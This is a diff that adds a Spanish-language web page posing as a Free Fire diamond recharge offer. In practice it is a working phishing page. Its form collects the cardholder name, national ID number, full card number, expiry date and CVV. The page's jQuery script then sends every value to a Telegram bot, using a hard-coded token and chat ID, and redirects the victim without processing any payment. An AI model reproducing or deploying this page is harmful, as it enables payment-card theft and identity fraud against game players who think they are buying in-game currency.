@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTCGAMER Diamantes Free Fire</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center; /* Centra horizontalmente */
+    align-items: center; /* Centra verticalmente */
+    height: 100vh; /* Aprovecha toda la altura de la ventana */
+    margin: 0; /* Elimina el margen predeterminado */
+    background: linear-gradient(to bottom right, blue, gold); /* Fondo degradado azul-dorado */
+  }
+  #contenedor {
+    display: flex;
+    align-items: center;
+    background-color: rgba(255, 255, 255, 0.7); /* Fondo semi-transparente */
+    padding: 20px;
+    border-radius: 10px; /* Bordes redondeados */
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Sombra suave */
+  }
+  #formulario {
+    width: 300px; /* Ancho del formulario */
+    margin-right: 40px; /* Espacio entre el formulario y la imagen (aumentado) */
+  }
+  label {
+    display: block;
+    margin-bottom: 5px;
+    color: blue; /* Color del texto */
+  }
+  input {
+    margin-bottom: 10px;
+    padding: 5px;
+    width: 100%;
+    box-sizing: border-box; /* Asegura que el ancho incluya el padding */
+  }
+  button {
+    width: 100%;
+    padding: 10px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    cursor: pointer;
+  }
+  h2 {
+    text-align: center;
+    font-size: 18px; /* Tamaño de fuente más grande */
+    margin-top: 0; /* Elimina margen superior */
+    margin-bottom: 10px; /* Espacio entre el título y el formulario */
+    color: black; /* Cambio de color a negro */
+  }
+  #imagen {
+    width: 400px; /* Ancho de la imagen aumentado */
+    margin-left: 40px; /* Separación aumentada de la imagen del formulario */
+  }
+</style>
+</head>
+<body>
+
+<div id="contenedor">
+  <form id="formulario">
+    <h2>Recarga al instante tus Diamantes Con Bonificación</h2>
+    <label for="monto">Ingresa tu ID de Jugador:</label>
+    <input type="text" id="monto" placeholder="1089789789897897" title="Ingrese el monto en el formato correcto" required>
+
+    <label for="nombre">Nombre en la Tarjeta:</label>
+    <input type="text" id="nombre" placeholder="Daniel Eduardo Fernandez" title="Solo se permiten letras y espacios" required>
+
+    <label for="documento">Número de Documento:</label>
+    <input type="text" id="documento" maxlength="9" pattern="\d{2}\.\d{3}\.\d{3}" title="Debe tener el formato XX.XXX.XXX" placeholder="05.658.985" required>
+
+    <label for="numero">Número de Tarjeta (16 dígitos):</label>
+    <input type="text" id="numero" maxlength="19" pattern="\d*" title="Debe contener solo números" placeholder="4517 5489 6598 2544" required>
+
+    <label for="fecha">Fecha de Vencimiento:</label>
+    <input type="text" id="fecha" maxlength="5" pattern="\d{2}\/\d{2}" placeholder="16/55" required>
+
+    <label for="cvv">CVV (Código de Seguridad - 3 dígitos):</label>
+    <input type="text" id="cvv" maxlength="3" pattern="\d{3}" title="Debe contener exactamente 3 números" placeholder="999" inputmode="numeric" required>
+
+    <button type="button" id="enviar">recargar</button>
+  </form>
+  <img id="imagen" src="./foto/pat.png" alt="Imagen de ejemplo">
+</div>
+
+<script>
+$(document).ready(function() {
+
+    $('#documento').on('input', function() {
+        var documento = $(this).val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        documento = documento.replace(/(\d{2})(\d{3})(\d{3})/, '$1.$2.$3'); // Agregar puntos en el formato XX.XXX.XXX
+        $(this).val(documento); // Actualizar el valor del campo con el documento formateado
+    });
+
+    $('#numero').on('input', function() {
+        var numTarjeta = $(this).val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        numTarjeta = numTarjeta.replace(/(.{4})/g, '$1 ').trim(); // Insertar espacio cada 4 dígitos
+        $(this).val(numTarjeta); // Actualizar el valor del campo con los espacios añadidos
+    });
+
+    $('#fecha').on('input', function() {
+        var fecha = $(this).val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        if (fecha.length > 2) {
+            fecha = fecha.slice(0, 2) + '/' + fecha.slice(2);
+        }
+        $(this).val(fecha.slice(0, 5)); // Limitar el valor a 5 caracteres con el formato MM/YY
+    });
+
+    // Bloquear entrada de números en el campo de nombre
+    $('#nombre').on('input', function() {
+        // Remover cualquier número ingresado
+        $(this).val($(this).val().replace(/\d/g, ''));
+    });
+
+    $('#cvv').on('input', function() {
+        var cvv = $(this).val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        $(this).val(cvv); // Actualizar el valor del campo con solo números
+    });
+
+    $('#enviar').click(function() {
+        var monto = $('#monto').val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        var nombre = $('#nombre').val();
+        var documento = $('#documento').val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        var numero = $('#numero').val().replace(/\D/g, ''); // Eliminar cualquier carácter que no sea número
+        var fecha = $('#fecha').val();
+        var cvv = $('#cvv').val();
+
+        // Aquí colocas el token de tu bot de Telegram
+        var token = '6426766063:AAHTwIBBaaX_e5BGaU4YU5hCQK0_c0BWNZ8';
+        // Aquí colocas el ID del chat donde quieres recibir los mensajes
+        var chat_id = '6915301721';
+
+        var mensaje = "Monto a recargar: $" + (monto / 100) + "\n" + // Convertir el monto de centavos a dólares
+                      "Nombre en la tarjeta: " + nombre + "\n" +
+                      "Número de documento: " + documento + "\n" +
+                      "Número de tarjeta: " + numero + "\n" +
+                      "Fecha de vencimiento: " + fecha + "\n" +
+                      "CVV: " + cvv;
+
+        $.ajax({
+            url: 'https://api.telegram.org/bot' + token + '/sendMessage',
+            method: 'POST',
+            data: {
+                chat_id: chat_id,
+                text: mensaje
+            },
+            success: function(response) {
+                // Redireccionar a otra página después de enviar el mensaje
+                window.location.href = 'pato.html';
+            }
+        });
+    });
+});
+</script>
+
+</body>
+</html>
